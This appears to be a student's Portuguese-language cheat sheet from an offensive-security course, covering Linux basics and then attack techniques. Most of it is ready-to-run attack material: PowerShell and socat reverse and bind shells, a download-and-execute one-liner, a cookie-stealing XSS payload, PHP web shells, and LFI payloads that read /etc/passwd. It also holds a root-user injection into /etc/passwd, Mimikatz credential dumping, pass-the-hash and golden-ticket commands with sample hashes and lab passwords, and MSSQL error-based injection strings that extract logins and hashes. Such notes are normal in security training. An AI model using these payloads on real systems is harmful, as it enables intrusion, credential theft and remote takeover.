ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" student@192.168.238.52 -p 2222
# Modulo 2
    ## Pesquisa em Manual por keyword
        man -k passwd
        man -k '^passwd$'
        apropos passwd 
    ## Criacao de multiplas pastas [parent directory]
        mkdir -p test/{recon,exploit,report}
    ## Encontrar arquivos 
        which cat 
        sudo updatedb; locate filename
        sudo find / -name file* 
        ### Exercicios 
            man find
            man -k compression
            which pwd
            sudo find / -type f ! -user root -mtime 5 -exec ls -l {} \;  
            find / -name flag.txt -exec cat {} \; 2> /dev/null
            find / -size 64c -exec base64 -d {} \; 2> /dev/null
                    b – 512-byte blocks (this is the default if no suffix is used)
                    c – bytes
                    w – two-byte words
                    k – Kilobytes
                    M – Megabytes
                    G – Gigabytes
            
    ## LS 
        ### opção 1 mostra cada arquivo por linha, bom pra automação
        ls -a1 
    ## Servicos 
        ### Gerenciar Serviço: start | status | stop | enable
        sudo systemctl start SERVICE_NAME
        systemctl list-unit-files
        ### Verificar serviço ouvindo em porta 
        sudo ss -anltp | grep sshd 
    ## APT 
        apt-cache search pure-ftpd
        apt show NOME_PACOTE | less 
        apt remove --purge pure-ftp 
        sudo dpkg -i ./arquivo
# Modulo 3
    ## Variaveis
        export b="variavel" #torna global
        echo $$ #Process ID do shell
        env
    ## History 
        !32 #executa a linha 32 do historico 
        !! #executa ultimo comando do historico 
    ## Text Searching and Manipulation 
        echo "I need to try hard" | sed 's/hard/harder/'
        echo "hello::there::friend" | awk -F "::" '{print $1, $3}' #faz um cut com o delimitador :: e pega o campo 1 e 3 
        # Uso Legal do AWK como cut para pegar subdominos em href
        grep "href=" index.html | awk -F "http://" '{print $2}' | cut -d '/' -f 1 

        ## Exercicios
            grep 'bin/false' /etc/passwd | awk -F ":" '{print "The user " $1 "home directory is " $7}'
            sed 's/Gnome DisplayDirectory/GDM/'
            # UID - mudando no passwd 
            sudo sed -i -e 's/1001/1014/g' /etc/passwd

    ## Comparison 
        comm texta textb 
        comm -12 texta textb #mostra apenas as linhas que aparecem em ambos
        diff texta textb
        vimdiff texta textb
    # Processes
        #Background - executar com & 
        ping -c 400 localhost &
        #Supender com: 
        ctrl+Z
        # Rodar em background processo suspenso
        bg 
        # ForeGground
        jobs 
        fg 
        fg %2 # Roda o job 2
        fg %ping
        fg %% #job atual
        fg %+ # atual
        fg %- # jobs anterior
        #Processos
        ps aux 
        ps -ef 
        ps -fC ping 
        kill 12345
        kill -9 12345
        pkill ping
            ## Exercicios 
            sudo find / -type f -mtime 7 -exec ls -l {} \; & 
            ps aux | grep -i firefox
            kill -9 12345

        # Monitorando arquivos e comandos
        tail -f arquivo
        tail -n5 arquivo 
        watch -n 5 ls
            ## Exercicios 
            watch "ps aux | sort -nrk 3,3 | head -n 5" # monitora os 5 processos que mais consomem cpu 
            
        #Download Files - linux 
        axel -a -n 20 -o output "http://URL.com/file.pdf"

        #Alias 
        alias lsa='ls -la'
        unlias lsa 
         
# Modulo 4 
    ## Socat 
        #Conectar 
            socat - TCP4:127.0.0.1:65000
        # OUVIR
            socat TCP4-LISTEN:65000 STDOUT
        # File Transfer
            socat TCP4-LISTEN:65000,fork file:arquivo.texta
            socat TCP4:127.0.0.1:65000 file:arquivo_recebido.txt,create
        # Reverse Shell -d -d para aumentar a verbosidade 
            socat -d -d TCP4-LISTEN:65000 STDOUT
            socat TCP4:127.0.0.1:65000 EXEC:/bin/bash
        # Bind Shell 
            socat TCP4-LISTEN:65000 EXEC:/bin/bash
            socat - TCP4:172.16.155.133:65000
        # SSL + Socat ==>> req -x509 representam o certificado auto assinado 
            # Quem escuta é quem fornece o certificado
            # Gerar chave e certificados auto assináveis 
            openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt 
            # converter em formato que o socat entenda 
            cat bind_shell.key bind_shell.crt > bind_shell.pem 
            # Bind - Socat com ssl 
            sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash 
            socat - OPENSSL:10.0.0.1:443,verify=0
            # Reverse - Socat com ssl 
            sudo socat OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork STDOUT
            socat OPENSSL:172.16.155.130:443,verify=0 EXEC:/bin/bash 
            
    ## PowerShell 
        Set-ExecutionPolicy Unrestricted 
        Get-ExecutionPolicy
        #Download Files 
        powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.0.0.10/file.txt', 'C:\Users\username\file.txt')"
        # Download e execucao em memoria 
        powershell -c "iex (new-object System.Net.WebClient).DownloadString('http://10.0.0.10/file.ps1')" 
        ## Reverse Shell com Powershell 
            $client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443); 
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535|%{0};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
            {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush();
            } 
            $client.Close();
            ###########
            ## OneLiner 
            powershell -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.155.133',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

            nc -nlvp 443 #Receber o shell 

        ## Bind Shell - OneLiner 
            powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

            nc -nv 10.0.0.10 443 # pegar o shell 
    
    ## PowerCat - netcat em powershell 
        #Fornecer no Kali - só pra deixar bizurado o servidor python
        sudo python3 -m http.server 80
        iex (new-object System.Net.WebClient).DownloadString('http://172.16.155.133/powercat.ps1'); powercat -h 

        powercat -c 10.0.0.10 -p 8080 -i Arquivo_A_Ser_Enviado.txt # nc -nlvp 8080 > Arquivo.txt
        powercat -l -p 8080 -e cmd.exe
        powercat -c 10.0.0.10 -p 8081 -e cmd.exe -g > reverve_shell.ps1
        powercat -c 10.0.0.10 -p 8081 -e cmd.exe -ge > Encrypted_Rev_Shell.ps1 
            powershell -E [BASE 64 GERADO NO COMANDO ACIMA]

    ## TCPDUMP 
        #r: Read, n: Sem resolver nome, X: hex,
        tcpdump -r arquivo.pcap 
        tcpdump -n src host 172.16.155.33 -r arquivo.pcap
        tcpdump -nX -r arquivo.pcap
        sudo tcpdump -nX dst host 172.16.155.134 -i eth0
        sudo tcpdump -ni eth0 tcp and port 443 -X 
 
# Modulo 7 
    ## DNS 
        # Forward e Reverse Lookup
        host www.megacorpone.com
        host 149.56.244.87

        for vhost in $(cat list.txt); do host $vhost.megacorpone.com; done  
        for ip in $(seq 1 255); do host 149.56.244.$ip; done | grep -vi "not found"

        # Tranferencia de zona 
        host -l DOMAIN_NAME DNS_SERVER
        host -l megacorpone.com ns2.megacorpone.com 
        host -t axfr  megacorpone.com ns2.megacorpone.com
        nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com 
        nmap --script-help dns-zone-transfer
        # Pesquisar por DNS Records específicos 
        host -t ns megacorpone.com
        host -t txt megacorpone.com 

        # DNSRECON 
        dnsrecon -d megacorpone.com -t axfr 
            # Brute force de subdominios com dnsrecon
        dnsrecon -d megacorpone.com -D ˜./list.txt -t brt 
        # DNSENUM 
            dnsenum megacorpone.com
    
    ## Port Scan 
        # NC - Tcp e Udp ===>>> -w timeout -z zero input e output 
            nc -nvv -w 1 -z 10.0.0.10 1-65535
            nc -nv -u -z -w 1 10.0.0.10 1-65535
        
        # IPTABLES - regra usada para monitorar quantidades de pacotes oriundas de um ip na apostila 
            sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT 
            sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT 
            sudo iptables -Z #Zera quantidade de pacotes do contador 
            iptables -vn -L

        # NMAP 
            sudo nmap -sS 10.0.0.10 #SynScan - nao complta o handshake e precisa de privilegio
            sudo nmap -n -sn 172.16.50.0/24 #Ping Sweep - Hostdiscover 
            nmap -sT -A --top-ports=20 10.0.0.1-254 -oG topPort-sweep.txt #Host discover com topports 
        # Massscan 
            sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
        ## SMB + NETBIOS 
            sduo nmap -v -p 139,445 0G smb.txt 10.0.0.1-254
            sudo nbtscan -r 10.0.0.0/24  
            enum4linux 

        ## NFS 
            nmap -p111,2049 10.0.0.1-254 # Procurar pelos NFS 
            nmap -sV -p 111 --script=rpcinfo 10.0.0.1-254 # procurar pelos RPCBind 

            #NFS ABuse 
                nmap --script nfs* 10.0.0.72 
                sudo mount -t nfs 10.11.1.72:/home /tmp/
                sudo mount -t nfs -o noclock 10.11.1.72:/home /mnt/hgfs/HD_KALI/OFFSEC/LAB/72/nfs  -o nfsvers=3
                sudo mount -o noclock 10.0.0.72:/home ~/home/
                ## Exemplo do PDF - Maneiro 

        ## SNMP 
            snmp-check {IP}
            onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100
            nmap --script "snmp* and not snmp-brute" {IP}
            hydra -P {Big_Passwordlist} -v {IP} snmp
            /usr/share/snmpenum/snmpenum.pl 10.10.10.5 <COMMUNITY NAME> /usr/share/snmpenum/windows.txt
            $ cat /usr/share/snmpenum/windows.txt                                                                                                                                                                                130 ⨯
                    Windows RUNNING PROCESSES       1.3.6.1.2.1.25.4.2.1.2
                    Windows INSTALLED SOFTWARE      1.3.6.1.2.1.25.6.3.1.2
                    Windows SYSTEM INFO             1.3.6.1.2.1.1.1
                    Windows HOSTNAME                1.3.6.1.2.1.1.5
                    Windows DOMAIN                  1.3.6.1.4.1.77.1.4.1
                    Windows UPTIME                  1.3.6.1.2.1.1.3
                    Windows USERS                   1.3.6.1.4.1.77.1.2.25
                    Windows SHARES                  1.3.6.1.4.1.77.1.2.27
                    Windows DISKS                   1.3.6.1.2.1.25.2.3.1.3
                    Windows SERVICES                1.3.6.1.4.1.77.1.2.3.1.1
                    Windows LISTENING TCP PORTS     1.3.6.1.2.1.6.13.1.3.0.0.0.0
                    Windows LISTENING UDP PORTS     1.3.6.1.2.1.7.5.1.2.0.0.0.0 

        braa [Community-string]@[IP of SNMP server]:[iso id]
        braa ignite123@192.168.1.125:.1.3.6.*

        https://github.com/dheiland-r7/snmp/blob/master/snmpbw.pl
        snmpbw.pl target comunity_name timeout threads


    ## Web Application Attack 
        dirb  http://www.megacorpone.com -r -z 10 
        ## XSS 
            ## Payloads - Caracteres chaves < > ' " { } ; 
            <script> alert("XSS")</script> 
            <iframe src=http://10.0.0.10/report height="0" width="0"> </iframe> 
            <script> new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie; </script>    

        ## Directory Transversal + LFI + RFI 
            <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
            <?php echo shell_exec($_GET['cmd']); ?>

        ## HTTP Serversc
            python -m SImpleHTTPServer 8080
            python3 -m http.server 8080 
            php -S 0.0.0.0:8080
            ruby -run -e http . -p 9000
            busybox httpd -f -p 10000

        ## Php Wrappers
            URL.php?var=data:text/plain,hello World
            URL.php?var=data:text/plain,<?php echo shell_exec("dir") ?>
            php?page=expect://ls
            
            #Input com o payload via POST 
            /fi/?page=php://input&cmd=ls
                #NO POST
                    <?php echo shell_exec($_GET ['cmd']) :?>
            
            vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
            ?page=php://filter/resource=/etc/passwd

        ## NULL Bytes 
            vuln.php?page=/etc/passwd%00
            vuln.php?page=/etc/passwd%2500

        ## SQLi 

# Modulo 8 
    # Buffer OVerflow 
         
# Modulo 10 - Client Side Attacks 
    ## HTA 
# Modulo 18 - Privilege Escalation 
    ## Manual Enumeration 
        ### Users
        C:\ whoami
        C:\ whoami /priv 
        C:\ net user 
        C:\ net user student
        $ id 
        $ cat /etc/passwd

        ### Hostname 
        C:\ hostname
        $ hostname

        ### OS Version
        C:\ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        $ cat /etc/issue
        $ cat /etc/*-release
        $ uname -a 
        $ uname -r # apenas a versão do kernel 

        ### Processos e servicos 
        C:\ tasklist /SVC 
        PS C:\ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
        C:\ wmic service whre caption="NOME_SERVICO" get name, caption, state, startmode # Verificar informacoes de servico especifico
        $ ps aux 
        
        ### Network 
        C:\ ipconfig /all 
        C:\ route print 
        C:\ netstat -ano 
        $ ip a 
        $ ifconfig a 
        $ /sbin/route
        $ routel 
        $ ss -anp 
        $ ss -nltp 
        $ netstat -anp 

        ### Firewall 
        C:\ netsh advfirewall show currentprofile 
        C:\ netsh advfirewall firewall show rule name=all 
        $ grep -Hs iptables /etc/* 

        ### Scheduled Task 
        C:\ schtasks /query /fo LIST /v 
        $ ls -lah /etc/cron*
        $ cat /etc/crontab 
        $ crontab -l 
        $ grep "CRON" /var/log/cron.log # Novo conhecimento! 

        ### Reiniciar a máquina
        C:\ shutdown /r /t 0 

        ### Application and PAtch Levels 
        C:\ wmic product get name, version, vendor 
        C:\ wmic qfe get Caption, Description, HotFixID, InstalledOn
        $ dpkg -l 

        ### Read Write files and directories 
        C:\ accesschk.exe -uws "Everyone" "C:\Program Files"
        PS C:\ Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
        $ find / -writable -type d 2> /dev/null 

        ### Unmounted Disk 
        C:\ mountvol 
        $ cat /etc/fstab 
        $ mount
        $ /bin/lsblk

        ### Device Drivers and Kernel Modules 
        PS C:\ driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path 
        PS C:\ Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
        
        $ lsmod # lista os modulos do kernel 
        $ /sbin/modinfo libata # pega mais informacoes sobre modulo especifico 

        ### binaries that autoelavate
        C:\ reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer 
        C:\ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer 
        $ find / -perm u=s -type f 2> /dev/null  

    ## UAC 
        # Abrir um cmd com privilegio de administrador - mesmo que clicar com botao direito 
        powershell.exe Strart-Process cmd.exe -Verb runAs 

    ## AddUser.c --> Adduser.exe Arquivo em C para adicionar usuário 
        i686-w64-mingw32-gcc adduser.c -o adduser.exe #Compilado no Kali 
    ## Compilar no Windows 
        cd mingw-64\i686-7.2.0-posix-dwarf-rt_v5-rev1
        mingw-w64.bat 
        gcc --help 

    ## Passwd privilege escalation => caso tenha possibilidade de escrita no passwd 
        openssl passwd SENHA
        echo "hacker:HASH_COMANDO_ACIMA:0:0:root:/root:/bin/bash" >> /etc/passwd
        su hacker 
    
# Modulo 19 - Password Attack 
    # Criação de Wordlist com Cewl e Rules do John
    cewl www.megacorpone.com -m 6 -w mega_cewl.txt #minimo de 6 caracteres 
        # No /etc/john/john.conf adicionar linha para uma rule especifica
            # Add two numbers to the end of each password 
            $[0-9]$[0-9]
    john --wordlist=mega_cewl.txt --rules --stdout > mutate.txt

    # Criar wordlist com crunch 
    crunch 8 8 -t ,@@^^%%%
        8 8 - minimo e máximo de 8 char 
        @ - lower case 
        , - upper case 
        % - numeric 
        ^ - especial Char   
    crunch 4 6  0123456789ABCDEF -o crunch.txt # cria wordlist de 4 a 6 com os caracteres especificados 
    crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o predefined-charset.txt 

    # Medusa 
        # HTTP AUTH 
        medusa -h 10.11.0.2 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
    # Crowbar - Nao conhecia - Mais confiavel para fazer forca bruta em RDP em novos windows 
        # Setar uma thread pois o RDP nao lida muito bem com mais de uma thread 
        crowbar -b rdp -s 10.11.119.229/32 -u Builder -C /usr/share/wordlists/rockyou.txt -n 1 
        iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou_utf8.txt #caso apareca que o arquivo nao existe


    # HYDRA em ssh 
        hydra -l kali -P ~/pass_file.txt ssh://127.0.0.1
    # HYDRA HTTP POST 
        hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
                /URI_PAGE.php:POST_DATA:GREP_FAILURE
        patator http_fuzz url=http://192.168.168.10/form/frontpage.php method=POST body='user=FILE0&pass=FILE1&Login=Login' 0=/tmp/user.txt 1=/usr/share/wordlists/rockyou.txt follow=1 accept_cookie=1 -x ignore:fgrep='INVALID LOGIN'

    # PATATOR FTP 
        patator ftp_login host=192.168.168.10 user=FILE0 password=FILE1  0=/tmp/user.txt 1=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Login or password incorrect!' 
        
# Modulo 21 - Active Directory 

    # Enumerate accounts and groups
        net user 
        net user /domain
        net user FULANO /domain
        net group /domain
        ## Script de powershell para enumerar DC
        .\OffSec_AD_enumerate.ps1 

    # Logged On Users
        # NetWkstaEnum - necessita de privilégios de Domain Administrator
        # NetSessionEnum - pode ser usado por usuario normal 
        ## POWERVIEW 
        Import-Module .\PowerView.ps1; 
            Get-NetLoggedon -ComputerName client251
            Get-NetSession -ComputerName dc01 

    # MIMIKATZ
        privilege::debug 
        # Logon Passwords
        sekurlsa::logonpasswords
        # Tickets  
        sekurlsa::tickets
        # Exportar tickets 
        kerberos::list /export

        # Kerberoasting - com  o ticket extraído 
        sudo apt install kerberoast 
        python /user/share/kerberoast/tgsrepcrack.py wordlist.txt CAMINHO/ARQUIVO.kirbi
        
    # Low and Slow Password guessing 
        net accounts # verificar política de travar login por tentativas falhas
        .\Spray-Passwords.ps1 -Pass blablabla -Admin # Script que está no Windows da OffSec 
    
    # Pass The Hash
        pth-winexe -U WORKGROUP/admin%db170c426eae78beff17365faf1ffe89:482563f0adaac6ca60c960c0199559d2 //10.10.10.20 cmd
        pth-winexe -U SVCLIENT73/administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
    
    # Over Pass The Hash - NTLM para kerberos ticket 
        # Mimikastz
            sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:8dh98adh8ash89dhas8dhas8908as /run:Powershell.exe
            sekurlsa::pth /user:pete /domain:svcorp.com /ntlm:0f951bc4fdc5dfcd148161420b9c6207 /ptt
            sekurlsa::pth /user:pete /domain:svcorp.com /rc4:0f951bc4fdc5dfcd148161420b9c6207 /ptt
            sekurlsa::pth /domain:svcorp.com /user:tris /rc4:08df3c73ded940e1f2bcf5eea4b8dbf6 /ptt

            .\Rubeus.exe asktgt /domain:svcorp.com /user:pete /rc4:0f951bc4fdc5dfcd148161420b9c6207 /ptt
            .\Rubeus.exe asktgt /domain:svcorp.com /user:tris /rc4:08df3c73ded940e1f2bcf5eea4b8dbf6 /ptt
            crackmapexec smb 10.11.1.20 -u 'tris' -H '08df3c73ded940e1f2bcf5eea4b8dbf6' -d SVCorp --ntds


        # Psexec 
            klist # verifica os tickets 
            net use \\SOMEshare # bizu para forçar a criação de um ticket naquele contexto 
            psexec.exe \\dc01 cmd.exe # PsExec irá usar o ticket que estiver dsisponível 

    # Pass The Ticket - 
        # TGT apenas pode ser usado na maquina para o qual foi criado, em contrapartida o TGS pode ser exportado e usado em outro lugar 

        # Silver Ticket
            # Descobrir o Domain SID - exclui os 4 ultimos digitos que sao do usuario 
            whoami /user
            # mimikatz
            kerberos::purge # Necessário limpar os tickets antes 
            kerberos::list
            kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-23123123231-12312312321-213123123123 /target:CorpWebServer.corp.com /service:HTTP /rc4:<Password hash da conta servico> /ptt
            kerberos::list 

    # DCOM Object
        # Usou DCOM objects para abrir um excel com macro no DC01 e executar um shell reverso (precisa da porta 135 e 445 abertas), age como um novo vetor de movimento lateral para tentar bypassar algum tipo de alerta

    # Golden Tickets - Obter o krbtgt para forjar novos tickets e criar persisitencia 
        # mimikatz
            lsadump::lsa /patch # Extrair o hashe do krbtgt

            kerberos::purge
            kerberos::golden /user:FAKEUser /domain:corp.com /sid:S-1-5-21-23123123231-12312312321-213123123123 /krbtgt:u2h3uh12ui3h192879828u38912982h9 /ptt
            misc::cmd
    ####### LEMBRAR !!!!! #######
        # Criou um golden ticket, sempre usar o SPN | Hostname dos alvos, se usar o IP isso forcara uma autenticacao com NTLM o que nao dará certo pois o usuário fake nao existe e nao tem hash 

    # DCSync 
        # Mimikatz
        lsadump::dcsync /user:Administrator
       

# MS SQL 
```
sqsh -S 10.11.1.31 -U sa -P poiuytrewq
mssqlclient.py -windows-auth sa:poiuytrewq@10.11.1.31

# CME tem que usar --local-auth se não dá erro
crackmapexec mssql 10.11.1.31 -u sa -p poiuytrewq --local-auth
crackmapexec mssql 10.11.1.31 -u sa -p poiuytrewq --local-auth -x 'type \users\administrator\desktop\proof.txt'
```

# MSSQL ERROR BASED
## Tem que ser aspas simples 

    ' + cast((SELECT @@version) as int) + '
    ' + cast((SELECT user_name()) as int) + '   ##webapp
    ' + cast((SELECT top 1 name + cast(0x3a3a3a3a as varchar) + password FROM master..syslogins where name=cast(0x776562617070 as varchar)) as int) + '

    ## Listar databases
        ' + CONVERT(INT,db_name(0)) + '  ## Newsletter   
        ' + CONVERT(INT,db_name(1)) + '  ## master
        ' + CONVERT(INT,(SELECT top 1 name FROM  master..sysdatabases)) + '      #master
        ' + CONVERT(INT,(SELECT top 1 name FROM master..sysdatabases WHERE name NOT IN (cast(0x6d6173746572 as varchar)))) + ' # archive




    SUSER_NAME()
    USER_NAME(SELECT is_srvrolemember('sysadmin'))
    PERMISSIONS()
    DB_NAME()
    FILE_NAME()
    TYPE_NAME()
    COL_NAME()
    CAST()
    CONVERT()

select x from OpenRowset(BULK "C:\Windows\win.ini" as varchar),SINGLE_CLOB) R(x)

cast(0x706f7765727368656c6c202d537461202d4e6f70202d57696e646f772048696464656e202d436f6d6d616e6420226375726c20687474703a2f2f3139322e3136382e3131392e3230352f7265763230352e657865202d4f757446696c65207265762e65786522 as varchar)


# Banco Newsletter 
    ### Primeira Tabela
        ' + CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES)) + '      #users
        ' + CONVERT(int,(select top(1) table_name from information_schema.columns)) + '    #users
        # listar colunas do banco atual
        ' + convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar))) + '   # user_id
        ' + convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar) AND COLUMN_NAME NOT IN ( cast(0x757365725f6964 as varchar)) ) ) + '  ## username
        ' + convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar) AND COLUMN_NAME NOT IN ( cast(0x757365725f6964 as varchar) , cast(0x757365726e616d65 as varchar)   ) ) ) + '  ## email
        ' + convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar) AND COLUMN_NAME NOT IN ( cast(0x757365725f6964 as varchar) , cast(0x757365726e616d65 as varchar), cast(0x656d61696c as varchar)   ) ) ) + '
    
    
    ### Segunda Tabela - Nao tem outra !!!!! 
    ' + CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN  ( cast(0x7573657273 as varchar) ) )) + ' 


    ### Extrcao da tabela users
    
    ' + CONVERT( INT,(SELECT top 1 username FROM users )) + '  #eric
    ' + CONVERT( INT,( SELECT top 1 username FROM users WHERE username NOT IN ( cast(0x65726963 as varchar) ) ) ) + ' #alice
    ' + CONVERT( INT,( SELECT top 1 username FROM users WHERE username NOT IN ( cast(0x65726963 as varchar),cast(0x616c696365 as varchar) ) ) ) + ' #pedro
    ' + CONVERT( INT,( SELECT top 1 username FROM users WHERE username NOT IN ( cast(0x65726963 as varchar),cast(0x616c696365 as varchar),cast(0x706564726f as varchar) ) ) ) + ' #admin
    ' + CONVERT( INT,( SELECT top 1 username FROM users WHERE username NOT IN ( cast(0x65726963 as varchar),cast(0x616c696365 as varchar),cast(0x706564726f as varchar),cast(0x61646d696e as varchar) ) ) ) + ' #asdasd
    ' + CONVERT( INT,( SELECT top 1 username FROM users WHERE username NOT IN ( cast(0x65726963 as varchar),cast(0x616c696365 as varchar),cast(0x706564726f as varchar),cast(0x61646d696e as varchar),cast(0x617364617364 as varchar) ) ) ) + '
    
    
    ' + CONVERT(INT,(SELECT top 1 email FROM users)) + '
    ' + CONVERT(INT,(SELECT top 1 email FROM users WHERE username=cast(0x61646d696e as varchar))) + '
    ' + CONVERT(INT,(SELECT top 1 user_id FROM users)) + '
    ' + CONVERT(INT,(SELECT top 1 user_id FROM users WHERE username=cast(0x616c696365 as varchar))) + '

##Listar tabelas 
    #MASTER
    ' + CONVERT(INT,(SELECT top(1) name FROM master..sysobjects WHERE xtype=cast(0x55 as varchar))) + '    1##trace_xe_action_map 2##trace_xe_event_map 3##spt_fallback_db
    ' + CONVERT(INT,(SELECT top(1) name FROM master..sysobjects WHERE xtype=cast(0x55 as varchar) AND name NOT IN ( cast(0x74726163655f78655f616374696f6e5f6d6170 as varchar),cast(0x74726163655f78655f6576656e745f6d6170 as varchar)  )  )) + '       

    # NEWSLETTER
    ' + CONVERT(INT,(SELECT top(1) name FROM newsletter..sysobjects WHERE xtype=cast(0x55 as varchar)  )) + ' #users
    ' + CONVERT(INT,(SELECT top(1) name FROM newsletter..sysobjects WHERE xtype=cast(0x55 as varchar) AND name NOT IN ( cast(0x7573657273 as varchar) )   )) + '

    # archive
    ' + CONVERT(INT,(SELECT top(1) name FROM archive..sysobjects WHERE xtype=cast(0x55 as varchar) )) + ' #pmanager
    ' + CONVERT(INT,(SELECT top(1) name FROM archive..sysobjects WHERE xtype=cast(0x55 as varchar) AND name NOT IN (cast(0x706d616e61676572 as varchar)))) + ' #NADA apeas pmanager

    # tudao 
    ' + CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES)) + '
    ' + CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN (cast(0x7573657273 as varchar))   )) + '

## listar colunas de outro banco 
    ' + convert(int,(select top(1) COLUMN_NAME from archive.information_schema.columns where TABLE_NAME=cast(0x706d616e61676572 as varchar))) + '  #id
    ' + convert(int,(select top(1) COLUMN_NAME from archive.information_schema.columns where TABLE_NAME=cast(0x706d616e61676572 as varchar) AND  COLUMN_NAME NOT IN (cast(0x6964 as varchar)) )) + '  #alogin
    ' + convert(int,(select top(1) COLUMN_NAME from archive.information_schema.columns where TABLE_NAME=cast(0x706d616e61676572 as varchar) AND  COLUMN_NAME NOT IN (cast(0x6964 as varchar),cast(0x616c6f67696e as varchar)) )) + ' psw
    ' + convert(int,(select top(1) COLUMN_NAME from archive.information_schema.columns where TABLE_NAME=cast(0x706d616e61676572 as varchar) AND  COLUMN_NAME NOT IN (cast(0x6964 as varchar),cast(0x616c6f67696e as varchar),cast(0x707377 as varchar) ) )) + ' # Nada mais

## Extrair da pmanager do archive - SELECT * FROM [TARGET_DATABASE].dbo.[TABLE] AS _TARGET
    # alogin - 
    ' + CONVERT( INT,(SELECT top 1 alogin FROM archive.dbo.pmanager )) + '  #FTPAdmin
    ' + CONVERT( INT,(SELECT top 1 alogin FROM archive.dbo.pmanager WHERE alogin NOT IN (cast(0x66747061646d696e as varchar))   )) + ' #webadmin
    ' + CONVERT( INT,(SELECT top 1 alogin FROM archive.dbo.pmanager WHERE alogin NOT IN (cast(0x66747061646d696e as varchar),cast(0x77656261646d696e as varchar) )   )) + ' #administrator
    ' + CONVERT( INT,(SELECT top 1 alogin FROM archive.dbo.pmanager WHERE alogin NOT IN (cast(0x66747061646d696e as varchar),cast(0x77656261646d696e as varchar),cast(0x61646d696e6973747261746f72 as varchar) )   )) + ' #eric
    ' + CONVERT( INT,(SELECT top 1 alogin FROM archive.dbo.pmanager WHERE alogin NOT IN (cast(0x66747061646d696e as varchar),cast(0x77656261646d696e as varchar),cast(0x61646d696e6973747261746f72 as varchar),cast(0x65726963 as varchar) )   )) + ' # Nada mais

    # psw
    ' + CONVERT( INT,(SELECT top 1 psw FROM archive.dbo.pmanager WHERE alogin=cast(0x66747061646d696e as varchar) )) + ' #ftpadmin::7de6b6f0afadd89c3ed558da43930181
